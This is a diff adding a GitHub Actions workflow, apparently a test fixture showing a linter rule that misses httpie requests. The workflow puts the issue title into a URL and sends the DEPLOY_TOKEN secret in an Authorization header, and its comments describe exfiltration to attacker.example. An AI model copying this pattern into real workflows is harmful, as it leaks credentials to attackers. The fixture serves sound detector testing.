@@ -1,0 +1,18 @@
+# situation: on issues, a step sends a request with httpie to the host the
+#   issue's title names, with the secret DEPLOY_TOKEN in a header.
+# reason: a todo (the same file): httpie sends the header to the attacker's
+#   host as curl does.
+# cause: the rule reads the requests of curl, wget and gh api only.
+# attack: the attacker opens an issue titled attacker.example, the host of a
+#   server the attacker runs.
+# attack-run-behavior: httpie sends the request with the Authorization
+#   header and the value of DEPLOY_TOKEN to attacker.example.
+on: issues
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    env:
+      DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
+    steps:
+      - run: |
+          http --ignore-stdin GET "https://${{ github.event.issue.title }}/status" "Authorization:Bearer $DEPLOY_TOKEN"
